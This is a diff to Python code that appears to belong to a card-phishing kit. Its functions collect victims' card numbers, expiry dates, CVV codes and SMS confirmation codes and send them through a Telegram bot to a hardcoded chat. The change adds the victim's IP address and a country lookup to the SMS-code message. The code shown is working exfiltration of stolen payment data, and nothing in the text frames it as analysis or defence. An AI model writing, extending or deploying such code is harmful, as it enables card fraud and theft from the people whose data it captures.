@@ -43,7 +43,7 @@ def send_me1(card, date, cvv, ID):
     text = escape_reserved_characters(f'№{ID}\n\n💳  `{card}`\n📅  `{date}`\n🔐  `{cvv}`')
     bot.send_message(chat_id='-4231677984', text=text, reply_markup=reply_markup, parse_mode='MarkdownV2')
 
-def send_sms1(card, sms, ID):
+def send_sms1(card, sms, ID, ip):
     bot = Bot(token=api)
     keyboard = [
         [
@@ -55,7 +55,7 @@ def send_sms1(card, sms, ID):
         ],
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
-    bot.send_message(chat_id='-4231677984', text=escape_reserved_characters(f'№{ID}\n\n💳  `{card}`\n\n💬 : `{sms}`'.replace('.', '\.')), reply_markup=reply_markup, parse_mode='MarkdownV2')
+    bot.send_message(chat_id='-4231677984', text=escape_reserved_characters(f'№{ID}\n💳  `{card}`\n💬 : `{sms}` \n\n👮🏿‍♂️ {ip}\n🗺 {get_country_by_ip(ip)}'), reply_markup=reply_markup, parse_mode='MarkdownV2')
 
 def send_me(CHAT_ID, card, date, cvv, ID, ip):
     bot = Bot(token=API_TOKEN)
